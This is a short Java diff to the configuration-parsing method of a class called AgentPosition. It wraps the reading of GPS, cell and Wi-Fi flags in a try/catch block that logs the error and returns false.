@@ -116,12 +116,18 @@ public class AgentPosition extends AgentBase implements IncrementalLog, Location
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) throws ConfigurationException {
+	public boolean parse(AgentConf conf) {
 
-		gpsEnabled = conf.getBoolean("gps");
-
-		cellEnabled = conf.getBoolean("cell");
-		wifiEnabled = conf.getBoolean("wifi");
+		try {
+			gpsEnabled = conf.getBoolean("gps");
+			cellEnabled = conf.getBoolean("cell");
+			wifiEnabled = conf.getBoolean("wifi");
+		} catch (ConfigurationException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse) Error: " + e);
+			}
+			return false;
+		}
 
 		if (Cfg.DEBUG) {
 			Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
